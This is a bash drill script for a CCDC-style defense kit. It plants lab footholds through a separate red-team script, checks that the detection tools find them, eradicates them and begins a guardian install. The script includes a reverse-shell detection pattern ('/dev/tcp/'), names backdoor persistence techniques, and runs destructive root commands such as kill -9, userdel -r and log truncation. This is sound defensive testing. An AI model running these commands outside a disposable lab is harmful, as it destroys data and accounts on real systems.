#!/usr/bin/env bash
#
# Automated regression run of playbooks/simulation-runbook.md: arm the defenses,
# let redteam/plant.sh land, detect, eradicate, then put guardian/sentry through
# nine attacks and prove --uninstall is exact. Prints PASS/FAIL per assertion.
#
# LAB VM ONLY, as root. It plants real footholds and installs real persistence.
# Snapshot first; revert after.
#
#   sudo bash drill.sh          (expects the kit at $KIT and a filled config at $CFG)
#   bash drill.sh --self-test   (safe parser/process-matcher regression test)
#
# This does NOT replace running the runbook by hand. The hand-run is where the
# muscle memory comes from; this is the regression test that proves the tooling
# still works after a change. It found two real bugs on its first run: a manifest
# race in guardian.sh and a keyword-only blind spot in hunt.sh's rc-file check.
# Automated CCDC drill: arm -> red team lands -> detect -> eradicate -> guardian
# survival. Runs as root on the lab VM. Prints PASS/FAIL per assertion.
set -u

# Kit root: the directory above this script, so the drill runs from wherever the
# kit was copied. Override either with the environment.
KIT=${CCDC_KIT_DIR:-$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)}
CFG=${CCDC_DRILL_CONFIG:-/root/ccdc-drill.env}

# Resolve guardian's installed layout in a clean shell. Keep these defaults in
# lockstep with linux/guardian.sh: the whole point of the drill is to attack the
# payload that is actually installed, including configurations which give every
# layer and payload an unrelated name.
guardian_value() {
  /bin/bash -c '
    . "$1"
    name=${CCDC_GUARDIAN_NAME:-node-health}
    evidence=${CCDC_EVIDENCE_DIR:-/var/tmp/ccdc-evidence}
    watch=${CCDC_GUARDIAN_WATCH_NAME:-$name-watch}
    ticker=${CCDC_GUARDIAN_TICKER_NAME:-$name}
    reconcile=${CCDC_GUARDIAN_RECONCILE_NAME:-$name-reconcile}
    cron=${CCDC_GUARDIAN_CRON_NAME:-$name}
    guardian_dir=${CCDC_GUARDIAN_DIR:-/usr/local/lib/$name}
    state_dir=${CCDC_GUARDIAN_STATE_DIR:-$evidence}
    sentry_name=${CCDC_SENTRY_NAME:-ccdc-sentry}
    sentry_dir=${CCDC_SENTRY_DIR:-/usr/local/lib/$sentry_name}
    watchdog_file=${CCDC_GUARDIAN_WATCHDOG_FILE:-$watch.sh}
    tick_file=${CCDC_GUARDIAN_TICK_FILE:-$ticker.sh}
    case "$2" in
      evidence) printf "%s" "$evidence" ;;
      name) printf "%s" "$name" ;;
      interval) printf "%s" "${CCDC_GUARDIAN_INTERVAL:-60}" ;;
      watch) printf "%s" "$watch" ;;
      ticker) printf "%s" "$ticker" ;;
      reconcile) printf "%s" "$reconcile" ;;
      cron) printf "%s" "$cron" ;;
      guardian_dir) printf "%s" "$guardian_dir" ;;
      state_dir) printf "%s" "$state_dir" ;;
      watchdog_file) printf "%s" "$watchdog_file" ;;
      tick_file) printf "%s" "$tick_file" ;;
      sentry_name) printf "%s" "$sentry_name" ;;
      sentry_dir) printf "%s" "$sentry_dir" ;;
      *) exit 2 ;;
    esac
  ' ccdc-drill "$1" "$2"
}

pid_has_payload() {
  local pid=$1 payload=$2
  case "$pid" in ''|0|*[!0-9]*) return 1 ;; esac
  [ -r "/proc/$pid/cmdline" ] || return 1
  tr '\0' '\n' <"/proc/$pid/cmdline" 2>/dev/null | grep -Fxq -- "$payload"
}

matching_payload_pids() {
  local payload=$1 proc pid found=''
  for proc in /proc/[0-9]*/cmdline; do
    [ -r "$proc" ] || continue
    tr '\0' '\n' <"$proc" 2>/dev/null | grep -Fxq -- "$payload" || continue
    pid=${proc#/proc/}
    pid=${pid%/cmdline}
    found="${found}${found:+ }$pid"
  done
  printf '%s' "$found"
}

unit_main_pid() {
  local pid
  pid=$(systemctl show --property MainPID --value "$1" 2>/dev/null) || return 1
  case "$pid" in ''|0|*[!0-9]*) return 1 ;; esac
  printf '%s' "$pid"
}

wait_payload_exit() {
  local pid=$1 payload=$2 remaining=${3:-10}
  while [ "$remaining" -gt 0 ] && pid_has_payload "$pid" "$payload"; do
    sleep 1
    remaining=$((remaining - 1))
  done
  ! pid_has_payload "$pid" "$payload"
}

systemd_runtime_knows() {
  local wanted=$1
  systemctl list-units --all --full --plain --no-legend "$wanted" 2>/dev/null \
    | awk -v wanted="$wanted" '$1 == wanted { found=1 } END { exit !found }'
}

run_self_test() {
  local tmp cfg payload pid pids failures=0
  tmp=$(mktemp -d /tmp/ccdc-drill-selftest.XXXXXX) || return 1
  cfg="$tmp/layout.env"
  payload="$tmp/custom-watch.sh"
  printf '%s\n' \
    'CCDC_EVIDENCE_DIR=/tmp/custom-evidence' \
    'CCDC_GUARDIAN_NAME=base-name' \
    'CCDC_GUARDIAN_INTERVAL=41' \
    'CCDC_GUARDIAN_WATCH_NAME=watch-layer' \
    'CCDC_GUARDIAN_TICKER_NAME=ticker-layer' \
    'CCDC_GUARDIAN_RECONCILE_NAME=reconcile-layer' \
    'CCDC_GUARDIAN_CRON_NAME=cron-layer' \
    'CCDC_GUARDIAN_DIR=/opt/custom-guardian' \
    'CCDC_GUARDIAN_STATE_DIR=/tmp/custom-state' \
    'CCDC_GUARDIAN_WATCHDOG_FILE=custom-watch.sh' \
    'CCDC_GUARDIAN_TICK_FILE=custom-tick.sh' >"$cfg"

  self_eq() {
    local key=$1 expected=$2 actual
    actual=$(guardian_value "$cfg" "$key")
    if [ "$actual" = "$expected" ]; then
      printf '  [PASS] layout %s = %s\n' "$key" "$expected"
    else
      printf '  [FAIL] layout %s: expected %s, got %s\n' "$key" "$expected" "$actual"
      failures=$((failures + 1))
    fi
  }

  self_eq evidence /tmp/custom-evidence
  self_eq name base-name
  self_eq interval 41
  self_eq watch watch-layer
  self_eq ticker ticker-layer
  self_eq reconcile reconcile-layer
  self_eq cron cron-layer
  self_eq guardian_dir /opt/custom-guardian
  self_eq state_dir /tmp/custom-state
  self_eq watchdog_file custom-watch.sh
  self_eq tick_file custom-tick.sh
  self_eq sentry_name ccdc-sentry
  self_eq sentry_dir /usr/local/lib/ccdc-sentry

  # The checked-in example deliberately assigns empty strings to optional
  # overrides. `${var:-default}` must treat those as unset, just as guardian
  # does; `${var-default}` would silently resolve an empty unit/payload name.
  printf '%s\n' \
    'CCDC_EVIDENCE_DIR=/tmp/default-evidence' \
    'CCDC_GUARDIAN_NAME=base-name' \
    'CCDC_GUARDIAN_WATCH_NAME=""' \
    'CCDC_GUARDIAN_TICKER_NAME=""' \
    'CCDC_GUARDIAN_RECONCILE_NAME=""' \
    'CCDC_GUARDIAN_CRON_NAME=""' \
    'CCDC_GUARDIAN_DIR=""' \
    'CCDC_GUARDIAN_STATE_DIR=""' \
    'CCDC_GUARDIAN_WATCHDOG_FILE=""' \
    'CCDC_GUARDIAN_TICK_FILE=""' >"$cfg"
  self_eq watch base-name-watch
  self_eq ticker base-name
  self_eq reconcile base-name-reconcile
  self_eq cron base-name
  self_eq guardian_dir /usr/local/lib/base-name
  self_eq state_dir /tmp/default-evidence
  self_eq watchdog_file base-name-watch.sh
  self_eq tick_file base-name.sh

  printf '#!/bin/bash\nwhile :; do sleep 1; done\n' >"$payload"
  /bin/bash "$payload" &
  pid=$!
  sleep 1
  if pid_has_payload "$pid" "$payload"; then
    printf '  [PASS] exact payload matcher found the intended process\n'
  else
    printf '  [FAIL] exact payload matcher missed the intended process\n'
    failures=$((failures + 1))
  fi
  pids=$(matching_payload_pids "$payload")
  case " $pids " in
    *" $pid "*) printf '  [PASS] payload scan returned the intended PID\n' ;;
    *) printf '  [FAIL] payload scan missed PID %s\n' "$pid"; failures=$((failures + 1)) ;;
  esac
  if pid_has_payload "$$" "$payload"; then
    printf '  [FAIL] exact payload matcher matched the test harness\n'
    failures=$((failures + 1))
  else
    printf '  [PASS] exact payload matcher rejected the test harness\n'
  fi
  kill "$pid" 2>/dev/null || true
  wait "$pid" 2>/dev/null || true
  find "$tmp" -depth -delete 2>/dev/null || true
  [ "$failures" -eq 0 ]
}

if [ "${1:-}" = '--self-test' ]; then
  [ "$#" -eq 1 ] || { printf 'usage: %s --self-test\n' "$0" >&2; exit 2; }
  run_self_test
  exit $?
fi
[ "$#" -eq 0 ] || { printf 'usage: %s [--self-test]\n' "$0" >&2; exit 2; }
[ "$(id -u)" -eq 0 ] || { printf 'run as root on a disposable lab VM\n' >&2; exit 1; }
[ -r "$CFG" ] || { printf 'drill config is not readable: %s\n' "$CFG" >&2; exit 1; }

EV=$(guardian_value "$CFG" evidence)
GUARD_DIR=$(guardian_value "$CFG" guardian_dir)
GUARD_STATE_DIR=$(guardian_value "$CFG" state_dir)
INT=$(guardian_value "$CFG" interval)
GUARD_WATCH_NAME=$(guardian_value "$CFG" watch)
GUARD_TICKER_NAME=$(guardian_value "$CFG" ticker)
GUARD_RECONCILE_NAME=$(guardian_value "$CFG" reconcile)
GUARD_CRON_NAME=$(guardian_value "$CFG" cron)
GUARD_WATCHDOG_FILE=$(guardian_value "$CFG" watchdog_file)
GUARD_TICK_FILE=$(guardian_value "$CFG" tick_file)
GUARD_WATCH_UNIT="$GUARD_WATCH_NAME.service"
GUARD_TICKER_UNIT="$GUARD_TICKER_NAME.service"
GUARD_RECONCILE_UNIT="$GUARD_RECONCILE_NAME.service"
GUARD_RECONCILE_TIMER="$GUARD_RECONCILE_NAME.timer"
GUARD_WATCHDOG_PATH="$GUARD_DIR/$GUARD_WATCHDOG_FILE"
GUARD_TICK_PATH="$GUARD_DIR/$GUARD_TICK_FILE"
SENTRY_NAME=$(guardian_value "$CFG" sentry_name)
SENTRY_DIR=$(guardian_value "$CFG" sentry_dir)
SENTRY_UNIT="$SENTRY_NAME.service"
SENTRY_UNIT_PATH="/etc/systemd/system/$SENTRY_UNIT"
SCORE_URL=${CCDC_DRILL_SCORE_URL:-http://127.0.0.1:8080/}
SCORED_UNIT=${CCDC_DRILL_SERVICE:-scored-web}
RUN_ID=$(date -u '+%Y%m%dT%H%M%SZ')-$$
DRILL_TMP=$(mktemp -d /tmp/ccdc-drill.XXXXXX) || exit 1
monitor_pid=''
DRILL_DROPIN_UNIT=''

cleanup_drill() {
  [ -z "$monitor_pid" ] || kill "$monitor_pid" >/dev/null 2>&1 || true
  [ -z "$monitor_pid" ] || wait "$monitor_pid" 2>/dev/null || true
  if [ -n "$DRILL_DROPIN_UNIT" ]; then
    systemctl disable --now "$DRILL_DROPIN_UNIT" >/dev/null 2>&1 || true
    rm -f "/etc/systemd/system/$DRILL_DROPIN_UNIT" >/dev/null 2>&1 || true
    [ ! -d "/etc/systemd/system/$DRILL_DROPIN_UNIT.d" ] \
      || find "/etc/systemd/system/$DRILL_DROPIN_UNIT.d" -depth -delete 2>/dev/null || true
    systemctl reset-failed "$DRILL_DROPIN_UNIT" >/dev/null 2>&1 || true
  fi
  systemctl daemon-reload >/dev/null 2>&1 || true
  find "$DRILL_TMP" -depth -delete 2>/dev/null || true
}
trap cleanup_drill EXIT
trap 'exit 129' HUP
trap 'exit 130' INT
trap 'exit 143' TERM

pass=0; fail=0
ok()  { printf '  [PASS] %s\n' "$1"; pass=$((pass+1)); }
no()  { printf '  [FAIL] %s\n' "$1"; fail=$((fail+1)); }
hdr() { printf '\n========== %s ==========\n' "$1"; }
note(){ printf '  ...   %s\n' "$1"; }

scored_up() { curl -fsS --max-time 4 -o /dev/null "$SCORE_URL" 2>/dev/null; }
unit_file() { [ -f "/etc/systemd/system/$1" ] && [ ! -L "/etc/systemd/system/$1" ]; }
wait_s()    { note "waiting ${1}s"; sleep "$1"; }

detect_fixed() {
  local label=$1 file=$2 needle=$3
  if [ -f "$file" ] && grep -Fq -- "$needle" "$file"; then
    ok "detected: $label"
  else
    no "MISSED: $label (expected '$needle' in $file)"
  fi
}

monitor_log="$DRILL_TMP/service-monitor.log"
start_service_monitor() {
  : >"$monitor_log"
  (
    while :; do
      if ! scored_up; then date -u '+%Y-%m-%dT%H:%M:%SZ FAIL' >>"$monitor_log"; fi
      sleep 1
    done
  ) &
  monitor_pid=$!
}

stop_service_monitor() {
  [ -z "$monitor_pid" ] || kill "$monitor_pid" >/dev/null 2>&1 || true
  [ -z "$monitor_pid" ] || wait "$monitor_pid" 2>/dev/null || true
  monitor_pid=''
}

cd "$KIT" || exit 1

# ---------------------------------------------------------------- phase 0
hdr "PHASE 0 - arm the defenses"
scored_up && ok "scored service answering at $SCORE_URL before we start" \
          || no "scored service is ALREADY down before the drill"

BASELINE="$EV/drill-$RUN_ID-baseline"
if ./linux/recon.sh --config "$CFG" --output-dir "$BASELINE" >"$DRILL_TMP/baseline.out" 2>&1 \
  && [ -f "$BASELINE/SHA256SUMS" ]; then
  ok "recon baseline captured ($(basename "$BASELINE"))"
else
  no "recon baseline failed or produced incomplete evidence"
  sed 's/^/      /' "$DRILL_TMP/baseline.out"
fi

if ./linux/canary.sh --config "$CFG" --deploy --apply >"$DRILL_TMP/canary-deploy.out" 2>&1; then
  ok "canary deploy command completed"
else
  no "canary deploy command failed"
  sed 's/^/      /' "$DRILL_TMP/canary-deploy.out"
fi
laid=$(wc -l < "$EV/canary.manifest" 2>/dev/null || echo 0)
[ "$laid" -ge 5 ] && ok "canary decoys laid ($laid)" || no "canary deployed only $laid decoys"

# ---------------------------------------------------------------- phase 1
hdr "PHASE 1 - the red team lands"
if ./redteam/plant.sh >"$DRILL_TMP/plant.out" 2>&1; then
  ok "plant.sh completed without a failed mutation"
else
  no "plant.sh reported one or more failed mutations"
  sed 's/^/      /' "$DRILL_TMP/plant.out"
fi
planted=$(wc -l < /root/.rt_manifest 2>/dev/null || echo 0)
[ "$planted" -ge 10 ] && ok "plant.sh landed $planted footholds" \
                      || no "plant.sh landed only $planted footholds"
sed 's/^/      /' /root/.rt_manifest 2>/dev/null

# ---------------------------------------------------------------- phase 2
hdr "PHASE 2 - detect it"
RECON_DIR="$EV/drill-$RUN_ID-recon"
HUNT_DIR="$EV/drill-$RUN_ID-hunt"
if ./linux/recon.sh --config "$CFG" --output-dir "$RECON_DIR" >"$DRILL_TMP/recon.out" 2>&1 \
  && [ -f "$RECON_DIR/SHA256SUMS" ]; then
  ok "post-plant recon completed with fresh evidence"
else
  no "post-plant recon failed or produced incomplete evidence"
fi
if ./linux/hunt.sh --config "$CFG" --output-dir "$HUNT_DIR" >"$DRILL_TMP/hunt.out" 2>&1 \
  && [ -f "$HUNT_DIR/SHA256SUMS" ]; then
  ok "post-plant hunt completed with fresh evidence"
else
  no "post-plant hunt failed or produced incomplete evidence"
fi
note "recon evidence: $(basename "$RECON_DIR")"
note "hunt evidence:  $(basename "$HUNT_DIR")"

detect_fixed "rogue user rtsvc" "$RECON_DIR/accounts.txt" 'rtsvc:'
detect_fixed "sudoers drop-in" "$RECON_DIR/sudoers.txt" '/etc/sudoers.d/rt-lab'
detect_fixed "service-home SSH key" "$RECON_DIR/ssh.txt" '/var/lib/rtsvc/.ssh/authorized_keys'
detect_fixed "exact attacker key body" "$RECON_DIR/ssh.txt" 'LABPLANTdummykeyforhuntdetection'
detect_fixed "cron.d implant" "$HUNT_DIR/persistence.txt" '=== /etc/cron.d/rt-cron ==='
detect_fixed "root crontab implant" "$HUNT_DIR/persistence.txt" '[root]'
detect_fixed "systemd timer backdoor" "$HUNT_DIR/persistence.txt" '/etc/systemd/system/rt-backdoor.timer'
detect_fixed "implant binary" "$HUNT_DIR/process-anomalies.txt" '/usr/local/bin/rt-implant'
detect_fixed "keyword-light profile hook" "$HUNT_DIR/persistence.txt" '=== /etc/profile.d/rt-profile.sh ==='
detect_fixed "first-line bashrc hook" "$HUNT_DIR/extra-persistence.txt" 'RT_LAB_PLANT lab bashrc hook'
detect_fixed "SUID root shell" "$HUNT_DIR/suid-capabilities.txt" '/usr/local/bin/rootbash'
detect_fixed "/dev/shm payload" "$HUNT_DIR/process-anomalies.txt" '/dev/shm/.rt'
[ ! -f /var/www/html/.rt-health.jsp ] \
  || detect_fixed "non-PHP web foothold" "$HUNT_DIR/web-files.txt" '/var/www/html/.rt-health.jsp'

printf '\n  -- score.sh native output --\n'
./redteam/score.sh "$HUNT_DIR" "$RECON_DIR" 2>&1 | sed 's/^/    /'
[ "${PIPESTATUS[0]}" -eq 0 ] && ok "score.sh returned success" || no "score.sh reported missed techniques"

# ---------------------------------------------------------------- phase 2b
hdr "PHASE 2b - the attacks that leave the disk looking normal"
#
# Everything scored above is an artifact on disk. These five are the ones a
# file-based sweep cannot see: a socket, a dropped kernel rule, an override
# file whose parent is untouched, a listener under no unit, and a log that is
# missing what it used to say. Each corresponds to a check added for it, and a
# check nobody has attacked is a check nobody has tested.
#
# Each block skips rather than fails when its plant was skipped: the plant
# refuses to take port 443 from a scored service, and a drill that fails
# because the VM is configured differently teaches the wrong lesson.

TRIAGE_OUT="$DRILL_TMP/triage-live.out"
./linux/triage.sh --config "$CFG" >"$TRIAGE_OUT" 2>&1
triage_rc=$?
[ "$triage_rc" -eq 3 ] && ok "triage flagged the planted box (exit 3)" \
                       || no "triage exit was $triage_rc, expected 3"

# 1. The reverse shell: bash holding an outbound connection on an allowed port.
if grep -q '^c2:bash-outbound' /root/.rt_manifest 2>/dev/null; then
  c2_line=$(grep '^c2:bash-outbound' /root/.rt_manifest | head -1)
  c2_where=${c2_line#*addr=}; c2_where=${c2_where%%|*}
  if grep -q 'should not be on the network' "$TRIAGE_OUT" \
     && grep -q 'outbound' "$TRIAGE_OUT"; then
    ok "triage found the outbound shell on $c2_where with no file to find"
  else
    no "the outbound reverse shell was NOT detected"
    grep -A4 'network' "$TRIAGE_OUT" | head -12 | sed 's/^/    /'
  fi
  # And the machine-readable side, which is what sentry consumes.
  if grep -q '^RED|netproc|.*bash' "$EV/triage.findings" 2>/dev/null; then
    ok "the shell reached the machine findings as RED netproc"
  else
    no "no RED netproc finding was written for the outbound shell"
  fi
  # Volatile capture has to get the socket and the parent BEFORE remediation.
  c2_shell_pid=${c2_line#*shell_pid=}; c2_shell_pid=${c2_shell_pid%%|*}
  if ./linux/preserve.sh --config "$CFG" --pid "$c2_shell_pid" \
       >"$DRILL_TMP/preserve.out" 2>&1; then
    case_dir=$(find "$EV/cases" -maxdepth 1 -type d -name "*pid$c2_shell_pid" 2>/dev/null | head -1)
    if [ -n "$case_dir" ] && [ -s "$case_dir/40-pid-$c2_shell_pid/ancestry.txt" ] \
       && [ -s "$case_dir/40-pid-$c2_shell_pid/sockets.txt" ]; then
      ok "preserve captured the shell's ancestry and socket while it was alive"
    else
      no "preserve did not capture the live process context"
    fi
  else
    no "preserve.sh failed on the live implant"
  fi
else
  note "skipped: outbound C2 was not planted on this VM"
fi

# 2. The audit rules the plant dropped, the way a service restart does.
if grep -q '^audit:runtime-rules-cleared' /root/.rt_manifest 2>/dev/null; then
  ./linux/audit.sh --config "$CFG" --check >"$DRILL_TMP/audit-check.out" 2>&1
  audit_rc=$?
  if [ "$audit_rc" -eq 3 ] && grep -q 'NOT LOADED\|NO persistent audit rules' "$DRILL_TMP/audit-check.out"; then
    ok "audit.sh noticed the rules were gone from the kernel"
  else
    no "audit.sh did not report the dropped rules (exit $audit_rc)"
    sed 's/^/    /' "$DRILL_TMP/audit-check.out" | head -10
  fi
  # And the repair that makes the difference between reporting and fixing.
  ./linux/audit.sh --config "$CFG" --apply >"$DRILL_TMP/audit-install.out" 2>&1
  ./linux/audit.sh --config "$CFG" --repair --apply >"$DRILL_TMP/audit-repair.out" 2>&1
  if auditctl -l 2>/dev/null | grep -q 'ccdc-'; then
    ok "audit rules were repaired back into the kernel"
  else
    no "audit repair did not restore the rules"
    sed 's/^/    /' "$DRILL_TMP/audit-repair.out" | head -10
  fi
  # The real test of persistence: survive the restart that dropped them.
  if systemctl restart auditd >/dev/null 2>&1 || service auditd restart >/dev/null 2>&1; then
    sleep 2
    if auditctl -l 2>/dev/null | grep -q 'ccdc-'; then
      ok "the rules SURVIVED an auditd restart (this is the whole point)"
    else
      no "an auditd restart dropped the rules again - persistence is not working"
    fi
  else
    note "could not restart auditd on this VM; persistence across restart untested"
  fi
else
  note "skipped: audit rules were not dropped on this VM"
fi

# 3. The SSH drop-in, with sshd_config untouched.
if [ -f /etc/ssh/sshd_config.d/99-rt-tuning.conf ]; then
  ./linux/sshd.sh --config "$CFG" >"$DRILL_TMP/sshd-audit.out" 2>&1
  sshd_rc=$?
  if grep -qi 'permitrootlogin is "yes"' "$DRILL_TMP/sshd-audit.out"; then
    ok "sshd.sh reported the EFFECTIVE root-login setting, not the main file"
  else
    no "the drop-in override was not detected"
    sed 's/^/    /' "$DRILL_TMP/sshd-audit.out" | head -12
  fi
  if grep -q '99-rt-tuning.conf' "$DRILL_TMP/sshd-audit.out"; then
    ok "sshd.sh named the drop-in file responsible"
  else
    no "sshd.sh did not name the responsible drop-in"
  fi
  if grep -q 'PermitRootLogin no' /etc/ssh/sshd_config 2>/dev/null; then
    ok "and sshd_config itself still says no - which is why reading it is not enough"
  else
    note "sshd_config does not contain an explicit PermitRootLogin no on this VM"
  fi
  [ "$sshd_rc" -eq 3 ] && ok "sshd audit exited 3" || no "sshd audit exit was $sshd_rc"
else
  note "skipped: sshd drop-in was not planted on this VM"
fi

# 4. The UDP listener under no systemd unit.
if grep -q '^udp-listener' /root/.rt_manifest 2>/dev/null; then
  udp_line=$(grep '^udp-listener' /root/.rt_manifest | head -1)
  udp_where=${udp_line#udp-listener:}; udp_where=${udp_where%%|*}
  udp_port=${udp_where##*:}
  ./linux/surface.sh --config "$CFG" >"$DRILL_TMP/surface.out" 2>&1
  if grep -qE "udp .*[^0-9]$udp_port .*REVIEW" "$DRILL_TMP/surface.out" \
     || grep -q "$udp_port" "$DRILL_TMP/surface.out"; then
    ok "surface.sh listed the rogue UDP listener on $udp_port"
  else
    no "the rogue UDP listener was not in the surface report"
  fi
  if grep -q "$udp_port" "$TRIAGE_OUT"; then
    ok "triage flagged the unaccounted UDP port as well"
  else
    no "triage did not flag the rogue UDP listener"
  fi
else
  note "skipped: UDP listener was not planted on this VM"
fi

# 5. The wiped auth log.
#
# This one needs a baseline to compare against, which is the point being
# tested: a size check with nothing to compare to cannot tell a wiped log from
# a quiet one. The drill takes a baseline, wipes again, and asserts.
if grep -q '^log-wipe' /root/.rt_manifest 2>/dev/null; then
  wipe_line=$(grep '^log-wipe' /root/.rt_manifest | head -1)
  wiped_log=${wipe_line#log-wipe:}; wiped_log=${wiped_log%%|*}
  logger -p auth.notice "drill baseline line" 2>/dev/null || true
  sleep 1
  ./linux/audit.sh --config "$CFG" --check >/dev/null 2>&1
  : >"$wiped_log" 2>/dev/null
  ./linux/audit.sh --config "$CFG" --check >"$DRILL_TMP/audit-wipe.out" 2>&1
  if grep -q 'SHRANK' "$DRILL_TMP/audit-wipe.out"; then
    ok "a truncated $wiped_log was reported as tampering"
  else
    no "the log wipe was not detected"
    sed 's/^/    /' "$DRILL_TMP/audit-wipe.out" | head -10
  fi
else
  note "skipped: no auth log was wiped on this VM"
fi

printf '\n  -- canary check --\n'
./linux/canary.sh --config "$CFG" --check >"$DRILL_TMP/canary-check.out" 2>&1
canary_rc=$?
sed 's/^/    /' "$DRILL_TMP/canary-check.out"
case "$canary_rc" in
  0) note "canary check was clean (expected when auditd is unavailable)" ;;
  3) ok "canary check surfaced planted writes/accesses" ;;
  *) no "canary check failed unexpectedly (exit $canary_rc)" ;;
esac

# ---------------------------------------------------------------- phase 3
hdr "PHASE 3 - eradicate (contain, remove, verify)"

# Watch the scored service for the whole of eradication, not just at the end.
# Checking once afterwards cannot tell "never went down" from "went down and
# came back" - and on the day, the scorer samples continuously.
start_service_monitor

# 1. CONTAIN: cut the account's access before removing anything.
passwd -l rtsvc >/dev/null 2>&1
rm -f /etc/sudoers.d/rt-lab
if visudo -c >/dev/null 2>&1; then
  ok "sudoers drop-in removed and sudo configuration still valid"
else
  no "sudo configuration is INVALID after removing the drop-in - fix before continuing"
fi

# 2. ERADICATE the account. userdel -r takes the service home with it, which is
# where this plant hides its authorized_keys.
userdel -r rtsvc >/dev/null 2>&1
id rtsvc >/dev/null 2>&1 && no "rogue user rtsvc still exists" || ok "rogue user removed"
[ -e /var/lib/rtsvc/.ssh/authorized_keys ] \
  && no "attacker SSH key survived in the service home" \
  || ok "attacker SSH key removed with the service home"

# 3. Schedulers and payloads.
rm -f /etc/cron.d/rt-cron
crontab -l 2>/dev/null | grep -v RT_LAB_PLANT | crontab - 2>/dev/null
systemctl disable --now rt-backdoor.timer >/dev/null 2>&1
rm -f /etc/systemd/system/rt-backdoor.service /etc/systemd/system/rt-backdoor.timer
systemctl daemon-reload
rm -f /usr/local/bin/rt-implant /usr/local/bin/rootbash /dev/shm/.rt \
      /etc/profile.d/rt-profile.sh /var/www/html/.rt-health.jsp
sed -i "/RT_LAB_PLANT/d" /root/.bashrc 2>/dev/null

left=0
for p in /etc/sudoers.d/rt-lab /etc/cron.d/rt-cron \
         /etc/systemd/system/rt-backdoor.service /etc/systemd/system/rt-backdoor.timer \
         /usr/local/bin/rt-implant /usr/local/bin/rootbash /dev/shm/.rt \
         /etc/profile.d/rt-profile.sh /var/www/html/.rt-health.jsp \
         /var/lib/rtsvc; do
  [ -e "$p" ] && { left=$((left+1)); note "still present: $p"; }
done
[ "$left" -eq 0 ] && ok "all file-based footholds removed" || no "$left foothold(s) survived"
crontab -l 2>/dev/null | grep -q RT_LAB_PLANT \
  && no "root crontab implant survived" || ok "root crontab implant removed"
head -n 1 /root/.bashrc 2>/dev/null | grep -q RT_LAB_PLANT \
  && no "first-line bashrc hook survived" || ok "bashrc hook removed"

# 4. RE-HUNT into a directory named up front. Selecting "the newest directory"
# after the fact is how this harness lied once already.
REHUNT_DIR="$EV/drill-$RUN_ID-rehunt"
if ./linux/hunt.sh --config "$CFG" --output-dir "$REHUNT_DIR" >"$DRILL_TMP/rehunt.out" 2>&1 \
  && [ -f "$REHUNT_DIR/SHA256SUMS" ]; then
  ok "post-eradication hunt completed with fresh evidence"
else
  no "post-eradication hunt failed or produced incomplete evidence"
fi
rehunt_hits=0
for needle in '/usr/local/bin/rt-implant' '/etc/systemd/system/rt-backdoor.timer' \
              '/usr/local/bin/rootbash' '/etc/profile.d/rt-profile.sh' \
              '/etc/sudoers.d/rt-lab' '/dev/shm/.rt' \
              'RT_LAB_PLANT lab bashrc hook' '/var/www/html/.rt-health.jsp'; do
  if grep -RFq -- "$needle" "$REHUNT_DIR"/*.txt 2>/dev/null; then
    note "re-hunt still sees: $needle"
    rehunt_hits=$((rehunt_hits + 1))
  fi
done
[ "$rehunt_hits" -eq 0 ] && ok "re-hunt is clean" \
                         || no "re-hunt still finds $rehunt_hits red-team artifact(s)"

# 4b. ERADICATE the live half: a socket, a listener, and an override file.
#
# Processes are killed by the exact payload path they were started with, never
# by name. `pkill python3` on a box whose scored service is a Python app is an
# outage you caused while cleaning up - which is the single most likely way for
# this drill to teach a habit that costs points on the day.
for payload in /usr/local/lib/.rt-c2.py /usr/local/lib/.rt-udp.py; do
  for proc in /proc/[0-9]*/cmdline; do
    [ -r "$proc" ] || continue
    tr '\0' '\n' <"$proc" 2>/dev/null | grep -Fxq -- "$payload" || continue
    pid=${proc#/proc/}; pid=${pid%/cmdline}
    kill -9 "$pid" 2>/dev/null || true
  done
  rm -f "$payload"
done
for proc in /proc/[0-9]*/cmdline; do
  [ -r "$proc" ] || continue
  tr '\0' '\n' <"$proc" 2>/dev/null | grep -q 'exec 3<>/dev/tcp/' || continue
  tr '\0' '\n' <"$proc" 2>/dev/null | grep -q 'while :; do sleep 3600' || continue
  pid=${proc#/proc/}; pid=${pid%/cmdline}
  kill -9 "$pid" 2>/dev/null || true
done
rm -f /etc/ssh/sshd_config.d/99-rt-tuning.conf
sleep 1

# The detectors have to go quiet again. A finding that cannot be cleared is
# indistinguishable from a broken check.
./linux/triage.sh --config "$CFG" >"$DRILL_TMP/triage-after.out" 2>&1
if grep -q 'should not be on the network' "$DRILL_TMP/triage-after.out"; then
  no "triage still reports a process on the network after eradication"
  grep -A3 'on the network' "$DRILL_TMP/triage-after.out" | head -8 | sed 's/^/      /'
else
  ok "the outbound shell and rogue listener are gone from triage"
fi
if [ -f /etc/ssh/sshd_config.d/99-rt-tuning.conf ]; then
  no "the malicious SSH drop-in survived eradication"
else
  ./linux/sshd.sh --config "$CFG" >"$DRILL_TMP/sshd-after.out" 2>&1
  if grep -qi 'permitrootlogin is "yes"' "$DRILL_TMP/sshd-after.out"; then
    no "root login is STILL enabled after removing the drop-in (something else sets it)"
  else
    ok "removing the drop-in restored the effective SSH policy"
  fi
fi

# 5. RECOVER: the service must have stayed up the entire time, not merely be up
# now. This is the assertion the monitor exists for.
stop_service_monitor
# `grep -c` exits 1 when it counts zero matches, so `|| echo 0` appends a SECOND
# zero and the variable becomes "0\n0" -- which then fails [ integer ] and gets
# reported as an outage. The zero-match case is the one we most want to read
# correctly, so never guard a count with ||.
outage_samples=$(grep -c FAIL "$monitor_log" 2>/dev/null || true)
[ -n "$outage_samples" ] || outage_samples=0
scored_up || no "scored service is DOWN after eradication"
if [ "$outage_samples" -eq 0 ]; then
  ok "scored service stayed up for every sample during eradication"
else
  no "scored service was unreachable for $outage_samples sample(s) during eradication"
  sed 's/^/      /' "$monitor_log" | head -5
fi

# ---------------------------------------------------------------- phase 4
hdr "PHASE 4 - guardian survival (the unproven paths)"
./linux/sentry.sh --config "$CFG" --install --apply >"$DRILL_TMP/sinstall.out" 2>&1
systemctl is-active --quiet "$SENTRY_UNIT" \
  && ok "fresh sentry authority installed before guardian enrollment" \
  || no "sentry install failed before guardian enrollment"
./linux/guardian.sh --config "$CFG" --install --apply >"$DRILL_TMP/ginstall.out" 2>&1
sed 's/^/      /' "$DRILL_TMP/ginstall.out" | head -20
grep -Fq "protected|$SENTRY_UNIT_PATH|" "$GUARD_STATE_DIR/guardian.manifest" 2>/dev/null \
  && ok "guardian manifest independently protects the sentry unit" \
  || no "guardian did not enroll sentry protection (check CCDC_GUARDIAN_PROTECT_SENTRY)"

